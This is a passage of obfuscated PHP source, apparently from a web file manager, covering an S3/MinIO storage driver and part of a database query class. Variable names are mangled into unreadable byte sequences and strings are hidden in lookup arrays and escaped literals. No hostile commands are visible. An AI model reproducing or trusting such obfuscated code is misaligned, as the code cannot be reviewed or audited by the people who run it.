$šĞëñ’ë[8]) . $šĞëñ’ë[8] : $ç¸º‘…; $åºÖù”û = get_file_mime(get_path_ext($ç¸º‘…)); $åˆ¬·´Ø = $this->client->putObject($‰Ü‚ªõ¹, $this->bucket, $ç¸º‘…, $šĞëñ’ë[229], array(), $åºÖù”û); if (!$åˆ¬·´Ø) { return !1; } if ($ÇÇ×âş) { return !0; } return $åˆ¬·´Ø ? !0 : !1; } public function fileSubstr($ù–¤¨ÂØ, $Ç¡¤‡”, $ëê×Û­) { $——®Â = $Ç¡¤‡” + $ëê×Û­ - 1; return $this->client->getObject($this->bucket, $ù–¤¨ÂØ, array($_SERVER[§Êá¸İ][244] => "\142\171\164\x65\163\x3d{$Ç¡¤‡”}\x2d{$——®Â}")); } public function upload($½‘›±ºÜ, $·±¶‚†–, $ÏÖÁö£Õ = false, $È´ñã„² = REPEAT_REPLACE) { $½üôıØÂ =& $_SERVER[§Êá¸İ]; $¼ÎóÆŸ = array($½üôıØÂ[245] => @md5_file($·±¶‚†–)); $¯™Û‡âç = array($½üôıØÂ[246] => get_file_mime(get_path_ext($½‘›±ºÜ))); if (IO::size($·±¶‚†–) <= 1024 * 1024 * 200) { $áß·ˆ´ö = $this->client->putObjectFile($·±¶‚†–, $this->bucket, $½‘›±ºÜ, $½üôıØÂ[229], $¼ÎóÆŸ, $¯™Û‡âç); return !empty($áß·ˆ´ö) ? $this->getPathOuter($½‘›±ºÜ) : !1; } $Ş¢İ™Ñâ = $this->client->multiUploadObject($·±¶‚†–, $this->bucket, trim($½‘›±ºÜ, $½üôıØÂ[8]), $¼ÎóÆŸ, $¯™Û‡âç); return $Ş¢İ™Ñâ ? $this->getPathOuter($½‘›±ºÜ) : !1; } public function download($ó®Âı®¨, $ö’»×Ÿå) { if (!@is_dir($this->pathFather($ö’»×Ÿå)) && !IO::mkdir($this->pathFather($ö’»×Ÿå))) { return !1; } $±Ùê÷À = $this->client->getObject($this->bucket, $ó®Âı®¨, array(), $ö’»×Ÿå); return $±Ùê÷À !== !1 ? $ö’»×Ÿå : !1; } public function link($Œ¼µ®È², $ÖÙü¤´¦ = array()) { $¶€àÁ÷³ =& $_SERVER[§Êá¸İ]; if ($this->signVer == $¶€àÁ÷³[247]) { return $this->client->getAuthenticatedURL($this->bucket, $Œ¼µ®È², 3600 * 12, $ÖÙü¤´¦); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Œ¼µ®È², $¶€àÁ÷³[8]), 3600 * 12, $this->region, array(), !0, $ÖÙü¤´¦); } public function fileOut($ó•¯î–’, $ÆÍ¼ Æƒ = false, $€Í¢Ğ² = false, $¾ŞË˜£» = '') { $ÁîÈÚŒ =& $_SERVER[§Êá¸İ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ó•¯î–’, $ÆÍ¼ Æƒ, $€Í¢Ğ², $¾ŞË˜£»); } if (!$€Í¢Ğ²) { $€Í¢Ğ² = $this->pathThis($ó•¯î–’); } $ÄíÅà¬õ = get_file_mime(get_path_ext($€Í¢Ğ²)); if ($ÄíÅà¬õ == $ÁîÈÚŒ[248]) { return parent::fileOut($ó•¯î–’, $ÆÍ¼ Æƒ, $€Í¢Ğ², $¾ŞË˜£»); } $öÈÚ…ş” = array($ÁîÈÚŒ[249] => $ÄíÅà¬õ); if ($ÆÍ¼ Æƒ) { $öÈÚ…ş”[$ÁîÈÚŒ[250]] = $ÁîÈÚŒ[251] . rawurlencode($€Í¢Ğ²); } else { } $˜¶Š¶°Í = $this->link($ó•¯î–’, $öÈÚ…ş”); $this->fileOutLink($˜¶Š¶°Í); } public function fileOutServer($±·¢ , $»ûë…İş = false, $§‰§´ø = false, $£Ûì¦âê = '') { parent::fileOut($±·¢ , $»ûë…İş, $§‰§´ø, $£Ûì¦âê); } public function fileOutImageServer($â²ìœ˜, $“¤Œ’Ïî = 250) { parent::fileOutImage($â²ìœ˜, $“¤Œ’Ïî); } public function hashMd5($·©×šÈ, $…Çµ¯® = '') { $ığÉ•éÛ = $this->objectMeta($·©×šÈ); if (!$ığÉ•éÛ) { return !1; } $…Çµ¯® = $…Çµ¯® ? $…Çµ¯® : _get($ığÉ•éÛ, $_SERVER[§Êá¸İ][252]); return $…Çµ¯®; } public function uploadFormData($§„¼‹ö¢, $ÑÍâÕ» = 3600) { $ÀâÄ¦«  =& $_SERVER[§Êá¸İ]; $•ÉÌ“ = $this->pathFather($§„¼‹ö¢); $ÃÀú Ïª = $this->client->getHttpUploadPostParams($this->bucket, $•ÉÌ“, $ÀâÄ¦« [229], $ÑÍâÕ»); return array_merge((array) $ÃÀú Ïª, array($ÀâÄ¦« [208] => $this->getHost())); } public function multiUploadFormData($Ó•º°¥Ñ, $¾Ãóè’ú = 3600) { $ııÕæ¦µ =& $_SERVER[§Êá¸İ]; $¸¤İŸã = gmdate($ııÕæ¦µ[253]); $ã…ºá…° = array(); $Š¯»ÊĞÓ = $this->client->getUploadId($this->bucket, $Ó•º°¥Ñ, $ã…ºá…°); if (!$Š¯»ÊĞÓ) { return !1; } return array($ııÕæ¦µ[254] => $Š¯»ÊĞÓ, $ııÕæ¦µ[208] => $this->getHost() . $ııÕæ¦µ[8] . $this->pathEncode($Ó•º°¥Ñ), $ııÕæ¦µ[255] => $¸¤İŸã, $ııÕæ¦µ[97] => $Ó•º°¥Ñ); } public function multiUploadAuthData($Å¶í»², $õ•¹úúï = array()) { $ª ¨—êØ =& $_SERVER[§Êá¸İ]; $¨¹Âş˜· = isset($õ•¹úúï[$ª ¨—êØ[255]]) ? $õ•¹úúï[$ª ¨—êØ[255]] : gmdate($ª ¨—êØ[253]); $‘Ëóíğ– = isset($õ•¹úúï[$ª ¨—êØ[169]]) ? $õ•¹úúï[$ª ¨—êØ[169]] : $ª ¨—êØ[12]; $‡•óúÆ¥ = $õ•¹úúï[$ª ¨—êØ[97]]; unset($õ•¹úúï[$ª ¨—êØ[97]]); if (isset($õ•¹úúï[$ª ¨—êØ[256]])) { $õ•¹úúï[$ª ¨—êØ[255]] = $¨¹Âş˜·; return $this->listUploadParts($‡•óúÆ¥, $õ•¹úúï); } $úú¤º¯õ = array($ª ¨—êØ[257], $ª ¨—êØ[12], $ª ¨—êØ[123], $ª ¨—êØ[12], "\170\x2d\x61\155\172\55\x64\141\164\x65\x3a{$¨¹Âş˜·}", $ª ¨—êØ[8] . $this->bucket . $ª ¨—êØ[8] . $this->pathEncode($‡•óúÆ¥) . $‘Ëóíğ–); if (strpos($‘Ëóíğ–, $ª ¨—êØ[258]) === 0) { $úú¤º¯õ[0] = $ª ¨—êØ[259]; } if (isset($õ•¹úúï[$ª ¨—êØ[260]]) && $õ•¹úúï[$ª ¨—êØ[260]] == $ª ¨—êØ[261]) { $úú¤º¯õ[0] = $ª ¨—êØ[261]; } $Õ¥¹•ò§ = implode($ª ¨—êØ[262], $úú¤º¯õ); $òÛ–ôôı = base64_encode(hash_hmac($ª ¨—êØ[263], $Õ¥¹•ò§, $this->secret, !0)); $¦Ë³ÏŠ‚ = $ª ¨—êØ[264] . $this->accessKey . $ª ¨—êØ[4] . $òÛ–ôôı; if (strpos($‘Ëóíğ–, $ª ¨—êØ[258]) === 0) { return array($ª ¨—êØ[265] => $¦Ë³ÏŠ‚, $ª ¨—êØ[255] => $¨¹Âş˜·); } return $¦Ë³ÏŠ‚; } public function listUploadParts($Æ“è©Ó, $’»Ï€²ß = array()) { $Œ»Ø =& $_SERVER[§Êá¸İ]; $æ²·ßëó = str_replace($Œ»Ø[266], $Œ»Ø[12], $’»Ï€²ß[$Œ»Ø[169]]); $²º‰¤€• = $this->client->listParts($this->bucket, $Æ“è©Ó, $æ²·ßëó); if (!$²º‰¤€•) { return !1; } unset($’»Ï€²ß[$Œ»Ø[256]], $’»Ï€²ß[$Œ»Ø[260]]); $’»Ï€²ß[$Œ»Ø[97]] = $Æ“è©Ó; $ô²ÖöÉ¹ = $this->multiUploadAuthData($Æ“è©Ó, $’»Ï€²ß); if (empty($ô²ÖöÉ¹)) { return !1; } return array($Œ»Ø[265] => $ô²ÖöÉ¹, $Œ»Ø[255] => $’»Ï€²ß[$Œ»Ø[255]], $Œ»Ø[267] => $²º‰¤€•); } public function getHost() { $êÍˆï¦ =& $_SERVER[§Êá¸İ]; $·Ş¹˜‰Ì = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($êÍˆï¦[70], $êÍˆï¦[64], $êÍˆï¦[69], $êÍˆï¦[62]))) { return $·Ş¹˜‰Ì . $êÍˆï¦[8] . $this->bucket; } $·Ş¹˜‰Ì = explode($êÍˆï¦[210], $·Ş¹˜‰Ì); return $·Ş¹˜‰Ì[0] . $êÍˆï¦[210] . $this->bucket . $êÍˆï¦[10] . $·Ş¹˜‰Ì[1]; } public function size($å¨ŸÊƒ§) { $ÑãÙ¸÷ = $this->objectMeta($å¨ŸÊƒ§); return $ÑãÙ¸÷ ? $ÑãÙ¸÷[$_SERVER[§Êá¸İ][79]] : 0; } public function info($ŠçÈºè’) { if ($this->isFolder($ŠçÈºè’)) { return $this->folderInfo($ŠçÈºè’); } else { if ($this->isFile($ŠçÈºè’)) { return $this->fileInfo($ŠçÈºè’); } } return !1; } public function exist($Œ÷îÉÑ™) { return $this->isFile($Œ÷îÉÑ™) || $this->isFolder($Œ÷îÉÑ™); } public function isFile($¶ÛÌÔÂ) { return !$this->isFolder($¶ÛÌÔÂ) && $this->objectMeta($¶ÛÌÔÂ); } public function isFolder($¸‹ó‡­Ò) { return $this->cacheMethod($_SERVER[§Êá¸İ][179], $¸‹ó‡­Ò); } protected function objectMeta($êüÖÄ¬ã) { return $this->cacheMethod($_SERVER[§Êá¸İ][181], $êüÖÄ¬ã); } protected function _objectMeta($¤ƒÌòşÑ) { $ÉŞşÜø =& $_SERVER[§Êá¸İ]; $¤ƒÌòşÑ = rtrim($¤ƒÌòşÑ, $ÉŞşÜø[8]); try { $²†´¹ = $this->client->getObjectInfo($this->bucket, $¤ƒÌòşÑ); if (!isset($²†´¹[$ÉŞşÜø[252]]) && isset($²†´¹[$ÉŞşÜø[268]])) { $²†´¹[$ÉŞşÜø[252]] = $²†´¹[$ÉŞşÜø[268]]; } } catch (Exception $ÀşËÛÓ¦) { $²†´¹ = !1; } if (!$²†´¹) { } return $²†´¹; } protected function _isFolder($ô¢ï©¹) { $ú‡…ıŠÛ =& $_SERVER[§Êá¸İ]; $ô¢ï©¹ = rtrim($ô¢ï©¹, $ú‡…ıŠÛ[8]); if ($ô¢ï©¹ == $ú‡…ıŠÛ[12] || $ô¢ï©¹ == $ú‡…ıŠÛ[8]) { return !0; } $¦ˆ¬ñ®Ü = $this->client->getBucket($this->bucket, $ô¢ï©¹, null, 1); if (empty($¦ˆ¬ñ®Ü[$ú‡…ıŠÛ[236]])) { return !1; } $ª§ÛÆ”˜ = $¦ˆ¬ñ®Ü[$ú‡…ıŠÛ[236]][0][$ú‡…ıŠÛ[32]]; return stripos($ª§ÛÆ”˜, $ô¢ï©¹ . $ú‡…ıŠÛ[8]) === 0 ? !0 : !1; if (substr($ª§ÛÆ”˜, -1) == $ú‡…ıŠÛ[8]) { return !0; } if (get_path_this($ª§ÛÆ”˜) == get_path_this($ô¢ï©¹)) { return !1; } return !0; } public function listObject($Ç®İøˆ†) { return $this->fileList($Ç®İøˆ†, $_SERVER[§Êá¸İ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Æ×†—©) { $®‚â“ÖÑ =& $_SERVER[§Êá¸İ]; parent::__construct($Æ×†—©); $this->setSignVersion($®‚â“ÖÑ[247]); if (!$this->region) { $this->region = $®‚â“ÖÑ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $é´ğ°ß = $this->getBucketRgn(); return $this->region == $é´ğ°ß ? !0 : !1; } public function uploadFormData($Œ×†ˆäå, $ƒßõúÕ = 3600) { $…ğææ›Ó =& $_SERVER[§Êá¸İ]; $®ŸùÒ = $…ğææ›Ó[229]; $ˆõ½¶ş = $…ğææ›Ó[270]; $ÔÄø­û« = $…ğææ›Ó[62]; $ç™‘÷£ = gmdate($…ğææ›Ó[271]); $ªÎØ‘ÑÍ = gmdate($…ğææ›Ó[272]); $Óæî´ğ = $…ğææ›Ó[273]; $¹üÑÓ­Ø = $ƒßõúÕ . $…ğææ›Ó[12]; $³ºÜ±ŸÔ = $…ğææ›Ó[274]; $­ôéãÇ‹ = array($this->accessKey, $ªÎØ‘ÑÍ, $this->region, $ÔÄø­û«, $Óæî´ğ); $ê¨ÉÎ¦Ü = implode($…ğææ›Ó[8], $­ôéãÇ‹); $È­¿™Ò‹ = array($…ğææ›Ó[275] => gmdate($…ğææ›Ó[276], strtotime($…ğææ›Ó[277])), $…ğææ›Ó[278] => array(array($…ğææ›Ó[279] => $this->bucket), array($…ğææ›Ó[280] => $®ŸùÒ), array($…ğææ›Ó[281], $…ğææ›Ó[282], $…ğææ›Ó[12]), array($…ğææ›Ó[281], $…ğææ›Ó[283], $…ğææ›Ó[12]), array($…ğææ›Ó[281], $…ğææ›Ó[284], $…ğææ›Ó[12]), array($…ğææ›Ó[285] => $³ºÜ±ŸÔ), array($…ğææ›Ó[286] => $ê¨ÉÎ¦Ü), array($…ğææ›Ó[287] => $ˆõ½¶ş), array($…ğææ›Ó[288] => $ç™‘÷£), array($…ğææ›Ó[289] => $¹üÑÓ­Ø))); $°ÃÇğÕ¾ = base64_encode(json_encode($È­¿™Ò‹)); $„áÜ‘´ğ = hash_hmac($…ğææ›Ó[290], $ªÎØ‘ÑÍ, $…ğææ›Ó[291] . $this->secret, !0); $š¬ëÓÊĞ = hash_hmac($…ğææ›Ó[290], $this->region, $„áÜ‘´ğ, !0); $½Ó¿­ÓŠ = hash_hmac($…ğææ›Ó[290], $ÔÄø­û«, $š¬ëÓÊĞ, !0); $ô§İ»óé = hash_hmac($…ğææ›Ó[290], $Óæî´ğ, $½Ó¿­ÓŠ, !0); $›³ªãÉá = hash_hmac($…ğææ›Ó[290], $°ÃÇğÕ¾, $ô§İ»óé); $½ÒÁà‹ = array($…ğææ›Ó[246] => $…ğææ›Ó[12], $…ğææ›Ó[292] => $…ğææ›Ó[12], $…ğææ›Ó[280] => $®ŸùÒ, $…ğææ›Ó[285] => $³ºÜ±ŸÔ, $…ğææ›Ó[293] => $°ÃÇğÕ¾, $…ğææ›Ó[294] => $ê¨ÉÎ¦Ü, $…ğææ›Ó[295] => $ˆõ½¶ş, $…ğææ›Ó[296] => $ç™‘÷£, $…ğææ›Ó[297] => $¹üÑÓ­Ø, $…ğææ›Ó[298] => $›³ªãÉá, $…ğææ›Ó[208] => $this->getHost()); return $½ÒÁà‹; } } goto Fóáµ†ªÉ†; dË¥×¡ÖÕ·: class DbSqlite3 extends DbSqlite3Base { public function query($ı©î€Å) { $¤ÂÔÍó¤ =& $_SERVER[§Êá¸İ]; if (!CacheLock::fileLock($¤ÂÔÍó¤[13])) { return !1; } $¥‡ØÜ˜€ = parent::query($ı©î€Å); CacheLock::fileUnLock($¤ÂÔÍó¤[13]); return $¥‡ØÜ˜€; } public function execute($ñÛˆ§ú·) { $¬œ¯õ†… =& $_SERVER[§Êá¸İ]; if (!CacheLock::fileLock($¬œ¯õ†…[13])) { return !1; } $ø®ÑíÎ¦ = parent::execute($ñÛˆ§ú·); CacheLock::fileUnLock($¬œ¯õ†…[13]); return $ø®ÑíÎ¦; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\x3c\x3e", "\147\164" => "\x3e", "\145\x67\x74" => "\76\x3d", "\154\x74" => "\74", "\145\x6c\x74" => "\74\75", "\156\157\164\x6c\x69\x6b\x65" => "\116\117\124\40\114\x49\x4b\105", "\x6c\x69\153\145" => "\114\111\113\105", "\151\156" => "\111\x4e", "\x6e\157\x74\151\x6e" => "\116\x4f\124\40\111\x4e", "\x6e\157\164\x20\x69\156" => "\116\x4f\x54\40\111\116", "\142\x65\x74\x77\x65\x65\156" => "\102\x45\124\127\105\x45\x4e", "\156\157\164\142\145\164\x77\145\145\156" => "\x4e\x4f\124\x20\x42\x45\124\x57\x45\105\116", "\x6e\157\x74\x20\142\145\x74\x77\145\x65\156" => "\x4e\117\124\40\102\x45\x54\x57\x45\105\x4e"); protected $selectSql = "\123\x45\114\x45\103\x54\45\104\x49\x53\124\111\116\103\124\45\40\x25\x46\x49\105\114\104\x25\40\x46\122\x4f\115\x20\x25\x54\x41\102\114\x45\45\x25\x4a\x4f\111\x4e\45\x25\127\110\x45\122\x45\45\x25\x47\122\x4f\125\120\45\45\x48\x41\x56\111\116\x47\45\45\x4f\122\104\x45\122\45\45\114\x49\115\x49\x54\x25\x20\45\125\x4e\x49\117\x4e\45\x25\103\x4f\x4d\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $ûß¢‹ñŒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[§Êá¸İ][1048], $ûß¢‹ñŒ); } public function factory($Ş…Û“Û = '') { $À¼Æì÷¶ =& $_SERVER[§Êá¸İ]; $Ş…Û“Û = $this->parseConfig($Ş…Û“Û); if (empty($Ş…Û“Û[$À¼Æì÷¶[1049]])) { think_exception(think_lang($À¼Æì÷¶[1050])); } $this->dbType = ucwords(strtolower($Ş…Û“Û[$À¼Æì÷¶[1049]])); $ª¸éÕö = $À¼Æì÷¶[1051] . $this->dbType; if (class_exists($ª¸éÕö)) { $ Ä’‹è÷ = new $ª¸éÕö($Ş…Û“Û); if ($À¼Æì÷¶[1052] != strtolower($Ş…Û“Û[$À¼Æì÷¶[1049]])) { $ Ä’‹è÷->dbType = strtoupper($this->dbType); } else { $ Ä’‹è÷->dbType = $this->_getDsnType($Ş…Û“Û[$À¼Æì÷¶[1004]]); } } else { think_exception(think_lang($À¼Æì÷¶[1053]) . $À¼Æì÷¶[1054] . $ª¸éÕö); } return $ Ä’‹è÷; } public function __call($ŞÚ½¦ôú, $ê™ª§“) { if (method_exists($this, $ŞÚ½¦ôú)) { return call_user_func_array(array($this, $ŞÚ½¦ôú), $ê™ª§“); } } protected function _getDsnType($•ÔÙ½òì) { $Ô×©´ãğ = explode($_SERVER[§Êá¸İ][4], $•ÔÙ½òì); $Ù•¥¥Ğƒ = strtoupper(trim($Ô×©´ãğ[0])); return $Ù•¥¥Ğƒ; } private function parseConfig($òìå¦É = '') { $ææšŸ³Ú =& $_SERVER[§Êá¸İ]; if (!empty($òìå¦É) && is_string($òìå¦É)) { $òìå¦É = $this->parseDSN($òìå¦É); } elseif (is_array($òìå¦É)) { $òìå¦É = array_change_key_case($òìå¦É); $òìå¦É = array($ææšŸ³Ú[1049] => $òìå¦É[$ææšŸ³Ú[1055]], $ææšŸ³Ú[975] => $òìå¦É[$ææšŸ³Ú[1056]], $ææšŸ³Ú[976] => $òìå¦É[$ææšŸ³Ú[1057]], $ææšŸ³Ú[973] => $òìå¦É[$ææšŸ³Ú[1058]], $ææšŸ³Ú[974] => $òìå¦É[$ææšŸ³Ú[1059]], $ææšŸ³Ú[21] => $òìå¦É[$ææšŸ³Ú[1060]], $ææšŸ³Ú[1004] => $òìå¦É[$ææšŸ³Ú[1061]], $ææšŸ³Ú[17] => isset($òìå¦É[$ææšŸ³Ú[1062]]) ? $òìå¦É[$ææšŸ³Ú[1062]] : array()); } elseif (empty($òìå¦É)) { if (think_config($ææšŸ³Ú[1063]) && $ææšŸ³Ú[1052] != strtolower(think_config($ææšŸ³Ú[1064]))) { $òìå¦É = $this->parseDSN(think_config($ææšŸ³Ú[1063])); } else { $òìå¦É = array($ææšŸ³Ú[1049] => think_config($ææšŸ³Ú[1064]), $ææšŸ³Ú[975] => think_config($ææšŸ³Ú[1065]), $ææšŸ³Ú[976] => think_config($ææšŸ³Ú[1066]), $ææšŸ³Ú[973] => think_config($ææšŸ³Ú[1067]), $ææšŸ³Ú[974] => think_config($ææšŸ³Ú[1068]), $ææšŸ³Ú[21] => think_config($ææšŸ³Ú[323]), $ææšŸ³Ú[1004] => think_config($ææšŸ³Ú[1063]), $ææšŸ³Ú[17] => think_config($ææšŸ³Ú[1069])); } } return $òìå¦É; } protected function initConnect($ı³ĞÚ = true) { if (1 == think_config($_SERVER[§Êá¸İ][22])) { $this->_linkID = $this->multiConnect($ı³ĞÚ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¤µù•Â => $µßæòà˜) { $this->_linkID = $µßæòà˜; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Œ€‘à— = false) { $¾ ÊÙÄ =& $_SERVER[§Êá¸İ]; static $°µËÃ™¸ = array(); static $ä’ÜÀí = -1; if (empty($°µËÃ™¸)) { foreach ($this->config as $ş¯ê => $ßÓõÊ) { $°µËÃ™¸[$ş¯ê] = explode($¾ ÊÙÄ[50], $ßÓõÊ); } } if (think_config($¾ ÊÙÄ[1070])) { if ($Œ€‘à— || think_config($¾ ÊÙÄ[471]) === !0) { $©ú–¿†™ = floor(mt_rand(0, think_config($¾ ÊÙÄ[1071]) - 1)); $ä’ÜÀí = $©ú–¿†™; } else { if (is_numeric(think_config($¾ ÊÙÄ[1072]))) { $©ú–¿†™ = think_config($¾ ÊÙÄ[1072]); } else { $©ú–¿†™ = floor(mt_rand(think_config($¾ ÊÙÄ[1071]), count($°µËÃ™¸[$¾ ÊÙÄ[973]]) - 1)); } } } else { $©ú–¿†™ = floor(mt_rand(0, count($°µËÃ™¸[$¾ ÊÙÄ[973]]) - 1)); $ä’ÜÀí = $©ú–¿†™; } $©ú–¿†™ = $ä’ÜÀí !== -1 ? $ä’ÜÀí : $©ú–¿†™; $‰ä´”ÈŞ = array($¾ ÊÙÄ[975] => isset($°µËÃ™¸[$¾ ÊÙÄ[975]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[975]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[975]][0], $¾ ÊÙÄ[976] => isset($°µËÃ™¸[$¾ ÊÙÄ[976]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[976]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[976]][0], $¾ ÊÙÄ[973] => isset($°µËÃ™¸[$¾ ÊÙÄ[973]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[973]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[973]][0], $¾ ÊÙÄ[974] => isset($°µËÃ™¸[$¾ ÊÙÄ[974]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[974]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[974]][0], $¾ ÊÙÄ[21] => isset($°µËÃ™¸[$¾ ÊÙÄ[21]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[21]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[21]][0], $¾ ÊÙÄ[1004] => isset($°µËÃ™¸[$¾ ÊÙÄ[1004]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[1004]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[1004]][0], $¾ ÊÙÄ[17] => isset($°µËÃ™¸[$¾ ÊÙÄ[17]][$©ú–¿†™]) ? $°µËÃ™¸[$¾ ÊÙÄ[17]][$©ú–¿†™] : $°µËÃ™¸[$¾ ÊÙÄ[17]][0]); return $this->connect($‰ä´”ÈŞ, $©ú–¿†™); } public function parseDSN($Ìåºîƒå) { $§˜„ÊßÄ =& $_SERVER[§Êá¸İ]; if (empty($Ìåºîƒå)) { return !1; } $÷±ÉºˆÈ = parse_url($Ìåºîƒå); if ($÷±ÉºˆÈ[$§˜„ÊßÄ[207]]) { $”‚é‘» = array($§˜„ÊßÄ[1049] => $÷±ÉºˆÈ[$§˜„ÊßÄ[207]], $§˜„ÊßÄ[975] => isset($÷±ÉºˆÈ[$§˜„ÊßÄ[670]]) ? $÷±ÉºˆÈ[$§˜„ÊßÄ[670]] : $§˜„ÊßÄ[12], $§˜„ÊßÄ[976] => isset($÷±ÉºˆÈ[$§˜„ÊßÄ[1073]]) ? $÷±ÉºˆÈ[$§˜„ÊßÄ[1073]] : $§˜„ÊßÄ[12], $§˜„ÊßÄ[973] => isset($÷±ÉºˆÈ[$§˜„ÊßÄ[208]]) ? $÷±ÉºˆÈ[$§˜„ÊßÄ[208]] : $§˜„ÊßÄ[12], $§˜„ÊßÄ[974] => isset($÷±ÉºˆÈ[$§˜„ÊßÄ[209]]) ? $÷±ÉºˆÈ[$§˜„ÊßÄ[209]] : $§˜„ÊßÄ[12], $§˜„ÊßÄ[21] => isset($÷±ÉºˆÈ[$§˜„ÊßÄ[87]]) ? substr($÷±ÉºˆÈ[$§˜„ÊßÄ[87]], 1) : $§˜„ÊßÄ[12]); } else { preg_match($§˜„ÊßÄ[1074], trim($Ìåºîƒå), $êõ¶ÜÀÓ); $”‚é‘» = array($§˜„ÊßÄ[1049] => $êõ¶ÜÀÓ[1], $§˜„ÊßÄ[975] => $êõ¶ÜÀÓ[2], $§˜„ÊßÄ[976] => $êõ¶ÜÀÓ[3], $§˜„ÊßÄ[973] => $êõ¶ÜÀÓ[4], $§˜„ÊßÄ[974] => $êõ¶ÜÀÓ[5], $§˜„ÊßÄ[21] => $êõ¶ÜÀÓ[6]); } $”‚é‘»[$§˜„ÊßÄ[1004]] = $§˜„ÊßÄ[12]; return $”‚é‘»; } protected function debug() { $¼‚™°£½ =& $_SERVER[§Êá¸İ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¼‚™°£½[1075]; if (think_config($¼‚™°£½[1076])) { think_status($¼‚™°£½[1077]); think_trace($this->queryStr . $¼‚™°£½[1078] . think_status($¼‚™°£½[24], $¼‚™°£½[1077], 6) . $¼‚™°£½[1079], $¼‚™°£½[12], $¼‚™°£½[1080]); } } protected function parseLock($³ú“±šÉ = false) { $ÉäÁäõé =& $_SERVER[§Êá¸İ]; if (!$³ú“±šÉ) { return $ÉäÁäõé[12]; } if ($ÉäÁäõé[1006] == $this->dbType) { return $ÉäÁäõé[1081]; } return $ÉäÁäõé[1082]; } protected function parseSet($³ËÊôÁ) { $Â¯Ç¶…‚ =& $_SERVER[§Êá¸İ]; foreach ($³ËÊôÁ as $íÌä¥‡‹ => $úÑ™²’ä) { if (is_array($úÑ™²’ä) && $Â¯Ç¶…‚[373] == $úÑ™²’ä[0]) { $Ğ³¹°…©[] = $this->parseKey($íÌä¥‡‹) . $Â¯Ç¶…‚[971] . $úÑ™²’ä[1]; } elseif (is_scalar($úÑ™²’ä) || is_null($úÑ™²’ä)) { $Ğ³¹°…©[] = $this->parseKey($íÌä¥‡‹) . $Â¯Ç¶…‚[971] . $this->parseValue($úÑ™²’ä); } } return $Â¯Ç¶…‚[1083] . implode($Â¯Ç¶…‚[50], $Ğ³¹°…©); } protected function bindParam($™†üœèå, $«ˆ¤ÙÓ½) { $this->bind[$_SERVER[§Êá¸İ][4] . $™†üœèå] = $«ˆ¤ÙÓ½; } protected function parseBind($¤ò†‰) { $¤ò†‰ = array_merge($this->bind, $¤ò†‰); $this->bind = array(); return $¤ò†‰; } function parseKey(&$®®ñ‡‘, $Á”‹Ô‹ü = true) { if ($Á”‹Ô‹ü) { $®®ñ‡‘ = $this->parseKeyCheck($®®ñ‡‘); } return $®®ñ‡‘; } function parseKeyCheck($¨ú àìï) { $£¶‚ß¤Ç =& $_SERVER[§Êá¸İ]; $¨ú àìï = trim($¨ú àìï); if (!preg_match($£¶‚ß¤Ç[1084], $¨ú àìï)) { think_exception($£¶‚ß¤Ç[1085] . $¨ú àìï); } return $¨ú àìï; } protected function parseValue($òë§ÁÒ) { $µæÁÍˆÅ =& $_SERVER[§Êá¸İ]; if (is_string($òë§ÁÒ)) { $òë§ÁÒ = $µæÁÍˆÅ[1045] . $this->escapeString($òë§ÁÒ) . $µæÁÍˆÅ[1045]; } elseif (isset($òë§ÁÒ[0]) && is_string($òë§ÁÒ[0]) && strtolower($òë§ÁÒ[0]) == $µæÁÍˆÅ[373]) { $òë§ÁÒ = $this->escapeString($òë§ÁÒ[1]); } elseif (is_array($òë§ÁÒ)) { $òë§ÁÒ = array_map(array($this, $µæÁÍˆÅ[1046]), $òë§ÁÒ); } elseif (is_bool($òë§ÁÒ)) { $òë§ÁÒ = $òë§ÁÒ ? $µæÁÍˆÅ[91] : $µæÁÍˆÅ[228]; } elseif (is_null($òë§ÁÒ)) { $òë§ÁÒ = $µæÁÍˆÅ[106]; } return $òë§ÁÒ; } protected function parseField($Êú–±ÍÔ) { $‡ˆØâ“à =& $_SERVER[§Êá¸İ]; if (is_string($Êú–±ÍÔ) && strpos($Êú–±ÍÔ, $‡ˆØâ“à[50])) { $Êú–±ÍÔ = explode($‡ˆØâ“à[50], $Êú–±ÍÔ); } if (is_array($Êú–±ÍÔ)) { $óØŒ§ƒ = array(); foreach ($Êú–±ÍÔ as $‚‘ïƒüÙ => $àÔ®œ³Æ) { if (!is_numeric($‚‘ïƒüÙ)) { $óØŒ§ƒ[] = 